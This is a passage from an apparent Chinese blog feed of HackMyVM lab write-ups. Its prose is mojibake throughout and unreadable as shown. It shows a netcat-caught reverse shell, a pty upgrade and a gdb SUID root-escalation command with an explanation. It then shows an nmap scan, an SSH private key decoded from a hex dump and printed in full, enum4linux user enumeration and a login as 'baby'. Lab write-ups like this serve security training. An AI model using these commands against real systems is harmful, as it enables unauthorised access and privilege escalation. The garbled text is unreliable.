<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/connections]</span><br><span class="line">â””â”€# nc -lp 1234</span><br><span class="line">Linux<span class="built_in"> connection </span>4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br><span class="line">Â 07:18:55 up 23 min,Â  0 users,Â  load average: 0.00, 0.00, 0.00<span class="built_in"></span></span><br><span class="line"><span class="built_in">USER </span>Â  Â  TTYÂ  Â  Â  <span class="keyword">FROM</span> Â  Â  Â  Â  Â  Â  LOGIN@ Â  IDLE Â  JCPU Â  PCPU WHAT</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ clear</span></span><br><span class="line"><span class="string">TERM environment variable not set.</span></span><br><span class="line"><span class="string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="string">&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ç”¨suidææƒ<br><img src="https://pic1.imgdb.cn/item/679a3d43d0e0a243d4f879ff.png" alt="|500"><br>è¿™é‡Œä½¿ç”¨gdbææƒ<br>åœ¨<a href="https://gtfobins.github.io/gtfobins/gdb/">gtfobins</a> ä¸­æ‰¾åˆ°ææƒæ–¹æ¡ˆ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line"><span class="symbol">/usr/bin/gdb</span> <span class="operator">-</span>nx <span class="operator">-</span>ex &#x27;python <span class="built_in">import</span> os; os.execl(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-p&quot;</span>)&#x27; <span class="operator">-</span>ex quit</span><br></pre></td></tr></table></figure></div>
<p>æ‹¿åˆ°rootæƒé™<br>åˆ†åˆ«åœ¨&#x2F;root å’Œ&#x2F;home&#x2F;connection ä¸­æ‰¾åˆ°flag</p>
<h3 id="è§£é‡Š-gdb-å‘½ä»¤"><a href="#è§£é‡Š-gdb-å‘½ä»¤" class="headerlink" title="è§£é‡Š gdb å‘½ä»¤"></a>è§£é‡Š <code>gdb</code> å‘½ä»¤</h3><h2 id="1-usr-bin-gdb"><a href="#1-usr-bin-gdb" class="headerlink" title="1. /usr/bin/gdb"></a>1. <code>/usr/bin/gdb</code></h2><ul>
<li><strong>ä½œç”¨</strong>ï¼šè¿™æ˜¯ <code>gdb</code> å‘½ä»¤çš„å®Œæ•´è·¯å¾„ï¼Œè¡¨ç¤ºè°ƒç”¨çš„æ˜¯ç³»ç»Ÿä¸­çš„ GNU è°ƒè¯•å™¨ï¼ˆGDBï¼‰ã€‚<code>gdb</code> æ˜¯ä¸€ä¸ªå¼ºå¤§çš„è°ƒè¯•å·¥å…·ï¼Œé€šå¸¸ç”¨äºè°ƒè¯•ç¨‹åºï¼Œä¹Ÿèƒ½æ‰§è¡Œä½çº§æ“ä½œï¼Œå¦‚è°ƒç”¨ç³»ç»Ÿå‘½ä»¤æˆ–æ‰§è¡Œç‰¹å®šä»£ç ã€‚</li>
</ul>
<h2 id="2-nx"><a href="#2-nx" class="headerlink" title="2. -nx"></a>2. <code>-nx</code></h2><ul>
<li><strong><code>-n</code></strong>ï¼šå¯åŠ¨æ—¶ä¸æ‰§è¡Œä»»ä½•åˆå§‹åŒ–æ–‡ä»¶ï¼ˆå¦‚ <code>.gdbinit</code>ï¼‰ï¼Œé¿å…åŠ è½½é»˜è®¤è®¾ç½®æˆ–ç”¨æˆ·é…ç½®æ–‡ä»¶ã€‚</li>
<li><strong><code>-x</code></strong>ï¼šæŒ‡å®š <code>gdb</code> æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶ï¼Œä½†åœ¨æ­¤å‘½ä»¤ä¸­ä½¿ç”¨ <code>-ex</code> ä»£æ›¿ï¼Œæ‰§è¡Œå†…è”å‘½ä»¤ã€‚</li>
</ul>
<h2 id="3-ex-python-import-os-os-execl-bin-bash-bash-p"><a href="#3-ex-python-import-os-os-execl-bin-bash-bash-p" class="headerlink" title="3. -ex &#39;python import os; os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)&#39;"></a>3. <code>-ex &#39;python import os; os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)&#39;</code></h2><ul>
<li><strong><code>-ex</code></strong>ï¼šç”¨äºæ‰§è¡Œ <code>gdb</code> å¯åŠ¨æ—¶è¦è¿è¡Œçš„å‘½ä»¤ï¼Œæ”¯æŒå¤šæ¬¡ä½¿ç”¨ã€‚</li>
<li><strong>Python è„šæœ¬</strong>ï¼š<ul>
<li><strong><code>import os</code></strong>ï¼šå¯¼å…¥ <code>os</code> æ¨¡å—ï¼Œç”¨äºä¸æ“ä½œç³»ç»Ÿäº¤äº’ã€‚</li>
<li><strong><code>os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)</code></strong>ï¼šç”¨ <code>execl</code> æ›¿æ¢å½“å‰è¿›ç¨‹ï¼ˆ<code>gdb</code>ï¼‰ä¸ºæ–°çš„è¿›ç¨‹ï¼Œå³å¯åŠ¨ <code>bash</code> shellã€‚<ul>
<li><strong><code>/bin/bash</code></strong>ï¼šæŒ‡å®šæ‰§è¡Œçš„ç¨‹åºï¼Œå³ <code>bash</code> shellã€‚</li>
<li><strong><code>&quot;bash&quot;</code></strong>ï¼šä¼ é€’ç»™ <code>bash</code> çš„å‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°é€šå¸¸æ˜¯æ‰§è¡Œå‘½ä»¤æœ¬èº«ã€‚</li>
<li><strong><code>&quot;-p&quot;</code></strong>ï¼šè®© <code>bash</code> ä¿æŒ <code>root</code> æƒé™ï¼Œå¦‚æœ <code>gdb</code> ä»¥ <code>root</code> æƒé™è¿è¡Œï¼Œæ–°å¯åŠ¨çš„ <code>bash</code> shell ä¹Ÿä¼šä¿æŒ <code>root</code> æƒé™ã€‚</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="4-ex-quit"><a href="#4-ex-quit" class="headerlink" title="4. -ex quit"></a>4. <code>-ex quit</code></h2><ul>
<li><strong>ä½œç”¨</strong>ï¼šåœ¨æ‰§è¡Œå®Œä¸Šè¿° Python è„šæœ¬åï¼Œç«‹å³é€€å‡º <code>gdb</code>ã€‚<code>gdb</code> æ‰§è¡Œå®Œå‘½ä»¤åä¼šé€€å‡ºï¼Œä½†æ–°å¯åŠ¨çš„ <code>bash</code> shell ä¼šç»§ç»­è¿è¡Œã€‚</li>
</ul>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-family2</title>
    <url>/posts/55076.html</url>
    <content><![CDATA[<p>HMV-family2é¶æœºå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67ada769d0e0a243d4fed2c0.png"></p>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.112.61  </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">13</span> <span class="number">16</span>:<span class="number">11</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">112.61</span>)</span><br><span class="line">Host is up (<span class="number">0.0028</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">991</span> closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span>  open  ssh         OpenSSH <span class="number">8.4</span>p1 Debian <span class="number">5</span> (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">3072</span> <span class="number">9</span>e:f1:ed:<span class="number">84</span>:cc:<span class="number">41</span>:<span class="number">8</span>c:<span class="number">7</span>e:c6:<span class="number">92</span>:a9:b4:<span class="number">29</span>:<span class="number">57</span>:bf:d1 (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">9</span>f:f3:<span class="number">93</span>:db:<span class="number">72</span>:ff:cd:<span class="number">4</span>d:<span class="number">5</span>f:<span class="number">09</span>:<span class="number">3</span>e:dc:<span class="number">13</span>:<span class="number">36</span>:<span class="number">49</span>:<span class="number">23</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> e7:a3:<span class="number">72</span>:dd:d5:af:e2:b5:<span class="number">77</span>:<span class="number">50</span>:ab:<span class="number">3</span>d:<span class="number">27</span>:<span class="number">12</span>:<span class="number">0</span>f:ea (ED25519)</span><br><span class="line"><span class="number">25</span><span class="symbol">/tcp</span>  open  smtp        Postfix smtpd</span><br><span class="line">| <span class="params">ssl-cert:</span> <span class="params">Subject:</span> commonName<span class="operator">=</span>debian</span><br><span class="line">| Subject Alternative <span class="params">Name:</span> DNS:debian</span><br><span class="line">| Not valid <span class="params">before:</span> <span class="number">202</span>1-<span class="number">1</span>0-<span class="number">31</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|_Not valid <span class="params">after:</span>  <span class="number">203</span>1-<span class="number">1</span>0-<span class="number">29</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|<span class="params">_smtp-commands:</span> debian.numericable.fr, PIPELINING, SIZE <span class="number">10240000</span>, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, <span class="number">8</span>BITMIME, DSN, SMTPUTF8, CHUNKING</span><br><span class="line">|<span class="params">_ssl-date:</span> TLS randomness does not represent time</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span>  open  http        Apache httpd <span class="number">2.4</span>.<span class="number">51</span></span><br><span class="line">|<span class="params">_http-title:</span> Index of <span class="symbol">/</span></span><br><span class="line">| <span class="params">http-ls:</span> Volume <span class="symbol">/</span></span><br><span class="line">| SIZE  TIME              FILENAME</span><br><span class="line">| <span class="number">11</span>K   <span class="number">202</span>1-<span class="number">1</span>0-<span class="number">31</span> <span class="number">16</span>:<span class="number">25</span>  nicegiftformybaby</span><br><span class="line">|_</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.51</span> (Debian)</span><br><span class="line"><span class="number">110</span><span class="symbol">/tcp</span> open  pop3        Dovecot pop3d</span><br><span class="line">|<span class="params">_ssl-date:</span> TLS randomness does not represent time</span><br><span class="line">| <span class="params">ssl-cert:</span> <span class="params">Subject:</span> commonName<span class="operator">=</span>debian</span><br><span class="line">| Subject Alternative <span class="params">Name:</span> DNS:debian</span><br><span class="line">| Not valid <span class="params">before:</span> <span class="number">202</span>1-<span class="number">1</span>0-<span class="number">31</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|_Not valid <span class="params">after:</span>  <span class="number">203</span>1-<span class="number">1</span>0-<span class="number">29</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|<span class="params">_pop3-capabilities:</span> TOP USER CAPA UIDL RESP-CODES PIPELINING SASL(PLAIN) AUTH-RESP-CODE STLS</span><br><span class="line"><span class="number">139</span><span class="symbol">/tcp</span> open  netbios-ssn Samba smbd <span class="number">4</span></span><br><span class="line"><span class="number">143</span><span class="symbol">/tcp</span> open  imap        Dovecot imapd</span><br><span class="line">|<span class="params">_imap-capabilities:</span> LOGIN-REFERRALS more SASL-IR ENABLE LITERAL<span class="operator">+</span> STARTTLS AUTH<span class="operator">=</span>PLAINA0001 listed post-login capabilities IDLE ID OK Pre-login have IMAP4rev1</span><br><span class="line">|<span class="params">_ssl-date:</span> TLS randomness does not represent time</span><br><span class="line">| <span class="params">ssl-cert:</span> <span class="params">Subject:</span> commonName<span class="operator">=</span>debian</span><br><span class="line">| Subject Alternative <span class="params">Name:</span> DNS:debian</span><br><span class="line">| Not valid <span class="params">before:</span> <span class="number">202</span>1-<span class="number">1</span>0-<span class="number">31</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|_Not valid <span class="params">after:</span>  <span class="number">203</span>1-<span class="number">1</span>0-<span class="number">29</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line"><span class="number">445</span><span class="symbol">/tcp</span> open  netbios-ssn Samba smbd <span class="number">4</span></span><br><span class="line"><span class="number">993</span><span class="symbol">/tcp</span> open  ssl<span class="symbol">/imap</span>    Dovecot imapd</span><br><span class="line">|<span class="params">_ssl-date:</span> TLS randomness does not represent time</span><br><span class="line">| <span class="params">ssl-cert:</span> <span class="params">Subject:</span> commonName<span class="operator">=</span>debian</span><br><span class="line">| Subject Alternative <span class="params">Name:</span> DNS:debian</span><br><span class="line">| Not valid <span class="params">before:</span> <span class="number">202</span>1-<span class="number">1</span>0-<span class="number">31</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|_Not valid <span class="params">after:</span>  <span class="number">203</span>1-<span class="number">1</span>0-<span class="number">29</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|<span class="params">_imap-capabilities:</span> LOGIN-REFERRALS SASL-IR ENABLE LITERAL<span class="operator">+</span> more IMAP4rev1 listed post-login capabilities IDLE AUTH<span class="operator">=</span>PLAINA0001 OK Pre-login have ID</span><br><span class="line"><span class="number">995</span><span class="symbol">/tcp</span> open  ssl<span class="symbol">/pop3</span>    Dovecot pop3d</span><br><span class="line">| <span class="params">ssl-cert:</span> <span class="params">Subject:</span> commonName<span class="operator">=</span>debian</span><br><span class="line">| Subject Alternative <span class="params">Name:</span> DNS:debian</span><br><span class="line">| Not valid <span class="params">before:</span> <span class="number">202</span>1-<span class="number">1</span>0-<span class="number">31</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|_Not valid <span class="params">after:</span>  <span class="number">203</span>1-<span class="number">1</span>0-<span class="number">29</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|<span class="params">_ssl-date:</span> TLS randomness does not represent time</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">3</span>E:<span class="number">78</span>:<span class="number">10</span>:<span class="number">7</span>B:<span class="number">5</span>C:A0 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">Hosts:</span>  debian.numericable.fr, <span class="number">127.0</span>.<span class="number">0.1</span>; <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script <span class="params">results:</span></span><br><span class="line">| <span class="params">smb2-security-mode:</span> </span><br><span class="line">|   <span class="number">3</span>:<span class="number">1</span>:<span class="number">1</span>: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">|<span class="params">_nbstat:</span> NetBIOS <span class="params">name:</span> FAMILY2, NetBIOS <span class="params">user:</span> <span class="symbol">&lt;unknown&gt;</span>, NetBIOS <span class="params">MAC:</span> <span class="symbol">&lt;unknown&gt;</span> (unknown)</span><br><span class="line">| <span class="params">smb2-time:</span> </span><br><span class="line">|   <span class="params">date:</span> <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">13</span>T08:<span class="number">12</span>:<span class="number">12</span></span><br><span class="line">|_  <span class="params">start_date:</span> N<span class="symbol">/A</span></span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.79</span> ms bogon (<span class="number">192.168</span>.<span class="number">112.61</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">30.07</span> seconds</span><br><span class="line">                                                             </span><br></pre></td></tr></table></figure></div>
<p>å¼€äº†å¾ˆå¤šç«¯å£ï¼Œè€è§„çŸ©å…ˆå»80çœ‹çœ‹ï¼Œå¦‚æœæ²¡æœ‰ä»€ä¹ˆä¿¡æ¯å°±å»å…¶ä»–ç«¯å£çœ‹çœ‹</p>
<h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>ç›´æ¥è®¿é—®80å¯ä»¥è¯»å–ä¸€ä¸ªä¸€ä¸ªæ–‡ä»¶ï¼Œé‡Œé¢æ˜¯sshçš„ç§é’¥<br><img src="https://pic1.imgdb.cn/item/67adaa59d0e0a243d4fed3d8.png"><br>è¿™ä¸ªæ˜¯ç§é’¥æ–‡ä»¶çš„åå…­è¿›åˆ¶è½¬å‚¨<code>xxd -r</code>å¯ä»¥è½¬æ¢å›åŸå§‹çš„ç§é’¥æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># xxd -r tmp &gt; id_rsa</span></span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># cat id_rsa       </span></span><br><span class="line"><span class="operator">-</span>----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAzZOTX1iTqzbIE7J3dr19v4jvvF2kr5lc8AakvHnEjksjGZlcCKai</span><br><span class="line">ajQj<span class="operator">+</span><span class="number">3</span>GdXLfWV5ErRfDKdeYlNNhjJvEGDZVT1JHm9VaB4cWsEjr5SlGcu<span class="symbol">/ciQmgTiU5rSs</span></span><br><span class="line"><span class="number">2</span>Iqc91FrWaNmIgcWeirQRPFrUOFqCm6aqfOAkchQA7e02GMRQ3a087zoOGzOHARPWnHMDG</span><br><span class="line">jaXZSTrdILKagQ1L59S55z<span class="operator">+</span>x3P5PAdCR2<span class="operator">+</span>uxujohsnk8HI6ZxaeEnbIMM8qJKdTipn<span class="symbol">/iB7</span></span><br><span class="line"><span class="number">3</span>gCMrFb4mMDgk58ALng7tG95df2MTVSUzKwH<span class="symbol">/ZpD/iOWow5uwauOu+cVC/G7rPWwgw3Lht</span></span><br><span class="line">ZBFCQ1w0EPFnEDIuoGbFUp1jObUtYEAAnUGiD9xEj2wW8RtS<span class="operator">+</span>RovSNoEZUk<span class="symbol">/sywHMFdMOS</span></span><br><span class="line">xTGPZf6YseS80B3jYCkVuUXvO6E3ioIZ6O1rkXIPLLddCjaXTWR3yA<span class="symbol">/0z7hIFvYdaNPuW9</span></span><br><span class="line">xE26DWLJApZImkK1YcTqFNzQCBdXh4WV<span class="symbol">/8TfEAQ1AAAFgG7azt5u2s7eAAAAB3NzaC1yc2</span></span><br><span class="line">EAAAGBAM2Tk19Yk6s2yBOyd3a9fb<span class="operator">+</span>I77xdpK<span class="operator">+</span>ZXPAGpLx5xI5LIxmZXAimomo0I<span class="symbol">/txnVy3</span></span><br><span class="line"><span class="number">1</span>leRK0XwynXmJTTYYybxBg2VU9SR5vVWgeHFrBI6<span class="operator">+</span>UpRnLv3IkJoE4lOa0rNiKnPdRa1mj</span><br><span class="line">ZiIHFnoq0ETxa1DhagpumqnzgJHIUAO3tNhjEUN2tPO86DhszhwET1pxzAxo2l2Uk63SCy</span><br><span class="line">moENS<span class="operator">+</span>fUuec<span class="symbol">/sdz+TwHQkdvrsbo6IbJ5PByOmcWnhJ2yDDPKiSnU4qZ/4ge94AjKxW+JjA</span></span><br><span class="line"><span class="number">4</span>JOfAC54O7RveXX9jE1UlMysB<span class="symbol">/2aQ/4jlqMObsGrjrvnFQvxu6z1sIMNy4bWQRQkNcNBDx</span></span><br><span class="line">ZxAyLqBmxVKdYzm1LWBAAJ1Bog<span class="symbol">/cRI9sFvEbUvkaL0jaBGVJP7MsBzBXTDksUxj2X+mLHk</span></span><br><span class="line">vNAd42ApFblF7zuhN4qCGejta5FyDyy3XQo2l01kd8gP9M<span class="operator">+</span><span class="number">4</span>SBb2HWjT7lvcRNug1iyQKW</span><br><span class="line">SJpCtWHE6hTc0AgXV4eFlf<span class="symbol">/E3xAENQAAAAMBAAEAAAGAbNgFAEd6r/0qQ9uLCvBbQuzy2Y</span></span><br><span class="line"><span class="number">3</span>PIzYVEfTChhQGsLwxkl0zcFUhyw9eOcQ26B9hui1fdwF9gJzg<span class="operator">+</span>DDVlomohcqZfwPc<span class="symbol">/+rU</span></span><br><span class="line">i8BIUcKtuN6rGI5JslU<span class="operator">+</span>esVtY0adZCM2QFbYlpCv0rtnUynj4gbstahLl45CDL4uPnEYDT</span><br><span class="line">nHofatPQDPjpDu701bqmdSGpQqzFaSTAaBi81kpo1usglcgIal2nc<span class="symbol">/R5uxjnolOI+Mxd0Q</span></span><br><span class="line">qaIK4q7GNWROt6E1rFNM1gaY<span class="operator">+</span>qmk1RHrPM0CLzp50ZHfR1fu4UKQuNIkBd9<span class="operator">+</span>wHC940EIDe</span><br><span class="line">Zx5Sv<span class="symbol">/oW1TWH0VWgFnO543LKn0aCawi6Qjyb1HpIOPbxo0ydyHl4YFlURRmrIiCctoLftp</span></span><br><span class="line">sbBcuf1CG9DFa5dEkBySxVzSG3DfTsOY6a9V0wZx2BZALRE07r61SzIRztXYXYiBM2Dzln</span><br><span class="line">AzONdkuRwXd3BuThjpllQmvZy24VFJWU<span class="operator">+</span>wumRfTB6gsqzyhyH9<span class="symbol">/VVpfC37/r9NGvDBAAAA</span></span><br><span class="line">wGUMzm9KkwoR477ZkKE<span class="operator">+</span>ItNQG<span class="symbol">/J1/9cG7ToLPDoSXc2lKnm181cE01FD8aQLM1ChBr4ahz</span></span><br><span class="line">tG<span class="operator">+</span>zg65VYXSFB3N0O9Mp0u9qc7Xc1h30SOdqm62T1K<span class="operator">+</span>nvHe2tXkNNEyEVxAAcSV1jr2HEm</span><br><span class="line">MTN66K0Mey5Iet23nUBZJOamFZTpj7fMZxDxTJq1jNUviDm6LgNdFIvgeRZQBRcVMHEf5g</span><br><span class="line">qjrDw8qoXn<span class="symbol">/ReLEYuPjLL8Up6hAxGCTcYU3HfpbsNv0xl2sQAAAMEA9lHGSQe0o4bQZmKs</span></span><br><span class="line">YwQjewX38Hs6SKop4Ci1OGNGeMaJI<span class="symbol">/6lxcouI95CZSNPRq3KNS4jKBYMCjoRQrisnNQLnL</span></span><br><span class="line">dVsk<span class="symbol">/sMjhs/NiXGHKZhUbv4e9vYxbuDZKQpbF9juSXt2DmA5zTLejPavBDVvE0uwVGq1uN</span></span><br><span class="line">xRna<span class="symbol">/yiBFZudgJMmkLIBcMClmZFoEFqBsWL5VjtZJZpWYCpYIedkeZDxPrgSO1LCTq9Rsq</span></span><br><span class="line">bKDlZoZfxvYtzbYK9nscdCljbKqCcRAAAAwQDVp<span class="operator">+</span>KeBCnL9T3qQmwZ<span class="operator">+</span>eNSUoTH6TCYwNOW</span><br><span class="line">EQTsW<span class="operator">+</span>srp8SNg2H0BB0HjLxzeHvBHBIZ2ye9L8G<span class="symbol">/XpsIM7aASbtaXChT6FqYT4Bb1pi067</span></span><br><span class="line"><span class="operator">+</span>LTxGM8HADjynVCWLnIKDzAAHBZHOwBwGwK6O1NDiFEor99Uqif7<span class="symbol">/YJACsP70lEOfL2rqk</span></span><br><span class="line">n1IGU2C9mjIUWVlU2V31bcGBZ4PI9d88oH46FeWloMvEpnVRIk8Q6<span class="operator">+</span>sdGke0yjB9TeDfL6</span><br><span class="line">O<span class="attr">CBlxZRwxH8uUAAAALYmFieUBkZWJpYW4</span><span class="operator">=</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>
<p>æœ¬æ¥æƒ³ç›´æ¥ç”¨hydraçˆ†ç ´sshï¼Œä½†æ˜¯è¿™é‡Œä¸èƒ½ç›´æ¥ç”¨å¯†ç ç™»å½•ssh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ssh root@<span class="number">192.168</span>.<span class="number">112.61</span>          </span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;192.168.112.61 (192.168.112.61)&#x27; can&#x27;t be established.</span></span><br><span class="line">ED25519 <span class="keyword">key</span> fingerprint <span class="built_in">is</span> SHA256:<span class="number">6</span>HwEGo4iDv1jBtZC87BkDOsTnZ+MUZAnS9pq7IEaNCo.</span><br><span class="line">This <span class="keyword">key</span> <span class="built_in">is</span> <span class="built_in">not</span> known <span class="keyword">by</span> any other names.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="symbol">Warning:</span> Permanently added <span class="comment">&#x27;192.168.112.61&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line">root@<span class="number">192.168</span>.<span class="number">112.61</span>: Permission denied (publickey).</span><br></pre></td></tr></table></figure></div>
<p>ç›®å½•æ‰«æäº†ä¸€æ³¢ï¼Œæ²¡æœ‰ä¿¡æ¯ã€‚<br>é‚£å°±ç»§ç»­å›åˆ°æ‰«æçš„ç«¯å£é‡Œé¢æ‰¾ä¿¡æ¯ï¼Œè¿™é‡Œçœ‹åˆ°è¿˜æœ‰ä¸€ä¸ªsmbï¼Œæ‰€ä»¥ç”¨enum4linuxæ‰«ä¸€ä¸‹ ç”¨<code>-a</code>å‚æ•°æŠŠåŸºæœ¬çš„éƒ½æ‰«ä¸€ä¸‹<br>æ‰«å‡ºæ¥äº†ä¸‰ä¸ªç”¨æˆ·åï¼Œä¸€å®¶äºº</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SUBUNIT"><figure class="iseeu highlight /subunit"><table><tr><td class="code"><pre><span class="line">[+] Enumerating users using SID S<span class="string">-1</span><span class="string">-22</span><span class="string">-1</span> and logon username &#x27;&#x27;, password &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">S<span class="string">-1</span><span class="string">-22</span><span class="string">-1</span><span class="string">-1000</span> Unix User\dad (Local User)</span><br><span class="line">S<span class="string">-1</span><span class="string">-22</span><span class="string">-1</span><span class="string">-1001</span> Unix User\mum (Local User)</span><br><span class="line">S<span class="string">-1</span><span class="string">-22</span><span class="string">-1</span><span class="string">-1002</span> Unix User\baby (Local User)</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åç”¨åˆšåˆšçš„ç§é’¥å»å°è¯•ä¸€ä¸‹<br>æˆåŠŸç™»å½•babyçš„shell</p>
